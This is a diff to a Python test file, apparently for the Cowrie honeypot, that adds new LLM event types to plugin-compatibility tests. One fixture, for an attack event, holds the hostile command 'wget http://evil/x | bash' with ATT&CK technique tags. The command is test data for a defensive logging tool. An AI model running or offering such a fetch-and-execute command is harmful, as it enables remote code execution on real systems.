@@ -17,10 +17,9 @@ is a separate manual step.
 from __future__ import annotations
 
 import time
-from unittest.mock import MagicMock, patch
+from unittest.mock import MagicMock
 
 from twisted.trial import unittest
-
 
 NEW_LLM_EVENT_IDS = (
     "cowrie.llm.prompt",
@@ -29,6 +28,9 @@ NEW_LLM_EVENT_IDS = (
     "cowrie.llm.token_reloaded",
     "cowrie.llm.session_budget_exhausted",
     "cowrie.llm.observation_leak",
+    "cowrie.llm.deterministic",
+    "cowrie.llm.attack",
+    "cowrie.llm.editor_save",
 )
 
 
@@ -56,6 +58,17 @@ def _llm_event(eventid: str, session: str = "abc123abc123") -> dict:
         base.update({"count": 201, "cap": 200})
     elif eventid == "cowrie.llm.observation_leak":
         base.update({})
+    elif eventid == "cowrie.llm.deterministic":
+        base.update({"input": "whoami", "cwd": "/root"})
+    elif eventid == "cowrie.llm.attack":
+        base.update({
+            "input": "wget http://evil/x | bash",
+            "techniques": ["T1105", "T1059.004"],
+            "technique_names": ["Ingress Tool Transfer", "Unix Shell"],
+            "tactics": ["command-and-control", "execution"],
+        })
+    elif eventid == "cowrie.llm.editor_save":
+        base.update({"input": "/tmp/payload.sh", "size": 42})
     return base
 
 
@@ -116,7 +129,7 @@ class TestPluginCompatibilityWithLLMEvents(unittest.TestCase):
         try:
             import pymisp  # noqa: F401
         except ImportError:
-            raise unittest.SkipTest("pymisp not installed (optional dep)")
+            raise unittest.SkipTest("pymisp not installed (optional dep)") from None
         plugin = _PluginHarness.make_misp()
         for eventid in NEW_LLM_EVENT_IDS:
             event = _llm_event(eventid)
@@ -129,7 +142,7 @@ class TestPluginCompatibilityWithLLMEvents(unittest.TestCase):
         try:
             import slack  # noqa: F401
         except ImportError:
-            raise unittest.SkipTest("slack SDK not installed (optional dep)")
+            raise unittest.SkipTest("slack SDK not installed (optional dep)") from None
         plugin = _PluginHarness.make_slack()
         for eventid in NEW_LLM_EVENT_IDS:
             event = _llm_event(eventid)
@@ -183,6 +196,7 @@ class TestJSONLogIncludesLLMEvents(unittest.TestCase):
 
     def test_llm_events_serialize_to_json(self):
         import json
+
         from cowrie.output.jsonlog import Output  # noqa: F401
         # Mirror the write() logic — strip the twisted-internal keys
         # then json.dump.
